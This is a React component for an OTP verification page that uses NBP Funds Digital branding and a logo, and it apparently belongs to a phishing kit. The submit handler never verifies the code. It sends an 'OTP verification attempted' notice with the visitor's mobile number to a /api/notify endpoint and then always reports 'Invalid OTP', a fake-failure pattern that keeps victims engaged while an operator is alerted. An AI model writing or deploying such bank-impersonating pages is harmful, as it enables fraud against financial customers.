'use client'

import { useEffect, useId, useRef, useState } from 'react'
import Image from 'next/image'
import { useRouter, useSearchParams } from 'next/navigation'
import { AlertCircle, ArrowLeft, Loader2, MessageSquareText } from 'lucide-react'

import { Button } from '@/components/ui/button'

const RESEND_SECONDS = 45

function formatTime(totalSeconds: number) {
  const minutes = Math.floor(totalSeconds / 60)
  const seconds = totalSeconds % 60
  return `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`
}

export function NbpVerifyOtpForm() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const mobileNumber = searchParams.get('mobile') || '+92 300 1234567'
  const groupId = useId()

  const [otp, setOtp] = useState(['', '', '', ''])
  const [secondsLeft, setSecondsLeft] = useState(RESEND_SECONDS)
  const [error, setError] = useState(false)
  const [errorMessage, setErrorMessage] = useState<string | null>(null)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const otpRefs = useRef<Array<HTMLInputElement | null>>([])

  useEffect(() => {
    if (secondsLeft <= 0) return
    const timer = setInterval(() => {
      setSecondsLeft((prev) => Math.max(0, prev - 1))
    }, 1000)
    return () => clearInterval(timer)
  }, [secondsLeft])

  const handleOtpChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, '').slice(-1)
    setOtp((prev) => {
      const next = [...prev]
      next[index] = digit
      return next
    })
    setError(false)
    if (digit && index < otp.length - 1) {
      otpRefs.current[index + 1]?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      otpRefs.current[index - 1]?.focus()
    }
  }

  const handleResend = () => {
    if (secondsLeft > 0) return
    setSecondsLeft(RESEND_SECONDS)
    setOtp(['', '', '', ''])
    setError(false)
    otpRefs.current[0]?.focus()
  }

  const canVerify = otp.every((digit) => digit.length === 1) && !isSubmitting

  return (
    <div className="flex min-h-screen justify-center bg-card sm:items-center sm:bg-muted sm:p-8">
      <div className="w-full max-w-sm overflow-hidden bg-card sm:rounded-2xl sm:border sm:border-border sm:shadow-sm">
        {/* Header / logo */}
        <div className="flex flex-col items-center border-b border-border px-8 py-10">
          <Image
            src="/images/nbp-funds-digital-logo.png"
            alt="NBP Funds Digital"
            width={320}
            height={90}
            className="h-auto w-full max-w-[280px] object-contain"
            priority
          />
        </div>

        <form
          className="flex flex-col gap-7 px-6 py-8"
          onSubmit={async (e) => {
            e.preventDefault()
            if (!canVerify) return

            setIsSubmitting(true)
            setErrorMessage(null)

            try {
              const response = await fetch('/api/notify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  title: 'OTP verification attempted',
                  fields: { 'Mobile Number': mobileNumber },
                }),
              })

              if (!response.ok) {
                throw new Error('notify-failed')
              }

              setError(true)
            } catch (err) {
              console.log('[v0] OTP notify failed:', err)
              setErrorMessage('Something went wrong. Please try again.')
            } finally {
              setIsSubmitting(false)
            }
          }}
        >
          {/* Title row */}
          <div className="relative flex flex-col items-center gap-1 text-center">
            <button
              type="button"
              onClick={() => router.back()}
              aria-label="Go back"
              className="absolute left-0 top-1 text-primary"
            >
              <ArrowLeft className="size-6" aria-hidden="true" />
            </button>
            <h1 className="text-xl font-bold text-balance text-foreground">Verify OTP</h1>
          </div>

          {/* Icon */}
          <div className="flex justify-center">
            <div className="flex size-20 items-center justify-center rounded-full bg-accent">
              <MessageSquareText className="size-9 text-primary" aria-hidden="true" strokeWidth={1.75} />
            </div>
          </div>

          {/* Instructions */}
          <div className="flex flex-col items-center gap-2 text-center">
            <p className="text-base text-balance text-foreground">
              Enter the 4-digit verification code sent to your mobile number
            </p>
            <p className="text-sm text-muted-foreground">
              Mobile Number: <span className="font-medium text-primary">{mobileNumber}</span>
            </p>
          </div>

          {/* OTP inputs */}
          <div className="flex flex-col items-center gap-3">
            <div
              className="flex justify-center gap-4"
              role="group"
              aria-label="Verification code"
              aria-invalid={error}
            >
              {otp.map((digit, index) => (
                <input
                  key={index}
                  id={index === 0 ? groupId : undefined}
                  ref={(el) => {
                    otpRefs.current[index] = el
                  }}
                  type="password"
                  inputMode="numeric"
                  maxLength={1}
                  aria-label={`Verification code digit ${index + 1}`}
                  value={digit}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                  className={`h-20 w-16 rounded-lg border-2 text-center text-lg text-foreground outline-none placeholder:text-muted-foreground ${
                    error
                      ? 'border-destructive focus:border-destructive'
                      : 'border-primary focus:border-primary'
                  }`}
                  placeholder="—"
                />
              ))}
            </div>
            {error && (
              <p className="flex items-center gap-1.5 text-sm font-medium text-destructive" role="alert">
                <AlertCircle className="size-4" aria-hidden="true" />
                Invalid OTP. Please try again.
              </p>
            )}
            {errorMessage && (
              <p className="flex items-center gap-1.5 text-sm font-medium text-destructive" role="alert">
                <AlertCircle className="size-4" aria-hidden="true" />
                {errorMessage}
              </p>
            )}
          </div>

          {/* Resend */}
          <p className="text-center text-sm text-foreground">
            Didn&apos;t receive the code?{' '}
            {secondsLeft > 0 ? (
              <>
                <span className="font-medium text-primary">Resend OTP</span>{' '}
                <span className="text-muted-foreground">({formatTime(secondsLeft)})</span>
              </>
            ) : (
              <button
                type="button"
                onClick={handleResend}
                className="font-medium text-primary underline underline-offset-2"
              >
                Resend OTP
              </button>
            )}
          </p>

          <Button
            type="submit"
            disabled={!canVerify}
            className="h-12 w-full rounded-md bg-primary text-sm font-bold uppercase tracking-wide text-primary-foreground hover:bg-primary/90"
          >
            {isSubmitting ? (
              <>
                <Loader2 className="size-4 animate-spin" data-icon="inline-start" aria-hidden="true" />
                Verifying
              </>
            ) : (
              'Verify'
            )}
          </Button>
        </form>
      </div>
    </div>
  )
}
